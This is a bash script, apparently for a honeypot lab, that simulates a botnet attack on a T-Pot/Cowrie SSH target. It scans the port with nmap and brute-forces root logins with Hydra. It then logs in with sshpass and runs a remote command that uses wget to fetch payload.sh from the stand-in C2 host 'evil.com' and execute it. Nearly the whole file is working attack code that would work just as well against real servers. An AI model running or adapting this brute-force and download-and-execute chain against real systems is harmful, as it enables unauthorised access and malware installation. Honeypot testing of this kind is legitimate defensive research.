#!/usr/bin/env bash
set -euo pipefail

TPOT_IP="${1:-}"
KALI_IP="${2:-}"
TPOT_PORT="${3:-${TPOT_PORT:-22}}"

usage() { echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
[[ -z "${TPOT_IP}" || -z "${KALI_IP}" ]] && usage

# Host C2 cố định theo yêu cầu
C2_HOST="evil.com"

say()  { printf "%s\n" "$*"; }
need() { command -v "$1" >/dev/null 2>&1 || { say "[!] Thiếu công cụ: $1"; exit 1; }; }
for t in nmap hydra sshpass wget awk sed grep; do need "$t"; done

TMPDIR="$(mktemp -d)"
cleanup(){ rm -rf "$TMPDIR" 2>/dev/null || true; }
trap cleanup EXIT

# --- Kiểm tra C2: chỉ wget ---
say "[*] Kiểm tra C2: http://${C2_HOST}/payload.sh ..."
if ! wget --spider -q --timeout=5 "http://${C2_HOST}/payload.sh"; then
  say "[!] Không truy cập được payload.sh tại ${C2_HOST}"
  say "    - Trên Kali (hoặc máy C2):  cd ~/c2server && python3 -m http.server 8000"
  say "    - Firewall:   sudo ufw allow 8000/tcp (nếu dùng ufw)"
  exit 2
fi
say "[+] C2 OK."

# --- Quét cổng ---
say "[*] Quét cổng SSH ${TPOT_IP}:${TPOT_PORT} ..."
nmap -sT -Pn -p "${TPOT_PORT}" "${TPOT_IP}" || true

# --- Wordlists ---
say "[*] Chuẩn bị danh sách user/pass ..."
USERS="${TMPDIR}/users.txt"
PWDS="${TMPDIR}/pass.txt"
printf "root\n" > "${USERS}"
cat > "${PWDS}" <<'EOF'
root
admin
123456
password
EOF

# --- Hydra ---
say "[*] Brute-force bằng Hydra ..."
HYDRA_OUT="${TMPDIR}/hydra.out"
hydra -L "${USERS}" -P "${PWDS}" -t 4 -V -f -o "${HYDRA_OUT}" "ssh://${TPOT_IP}" -s "${TPOT_PORT}" || true

USER_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print u; exit}}' "${HYDRA_OUT}" || true)"
PASS_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print p; exit}}' "${HYDRA_OUT}" || true)"

if [[ -n "${USER_FOUND}" && -n "${PASS_FOUND}" ]]; then
  USER="${USER_FOUND}"
  PASS="${PASS_FOUND}"
  say "[+] Dùng cred: ${USER} / ${PASS}"
else
  say "[!] Hydra KHÔNG tìm thấy cred → dùng mặc định LAB: root / admin"
  USER="root"
  PASS="admin"
fi

# --- CHỈ wget, không () không && không || ---
REMOTE_CMD='sh -c "
cd /tmp;
rm -f payload.sh;
wget -q -O payload.sh http://'${C2_HOST}'/payload.sh;
if [ ! -s payload.sh ]; then echo '\''[!] payload.sh rỗng/không tải được'\''; exit 10; fi;
chmod +x payload.sh;
sh payload.sh
"'

# --- SSH: dùng lại -tt để tránh '\''exec request failed on channel 0'\'' ---
say "[*] SSH vào Cowrie & chạy payload (wget) ..."
set +e
sshpass -p "${PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=8 \
  -o ServerAliveInterval=5 \
  -o ServerAliveCountMax=2 \
  -p "${TPOT_PORT}" \
  -tt "${USER}@${TPOT_IP}" "${REMOTE_CMD}"
SSH_RC=$?
set -e

if [[ ${SSH_RC} -ne 0 ]]; then
  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). (Cowrie có thể đóng phiên sớm hoặc container không ra được ${C2_HOST})"
  say "    Kiểm tra từ TRONG container Cowrie:"
  say "      docker exec -it cowrie sh -lc \"wget -qO- http://${C2_HOST}/payload.sh | head\""
  exit 3
fi

say "[+] Hoàn tất mô phỏng botnet."
exit 0
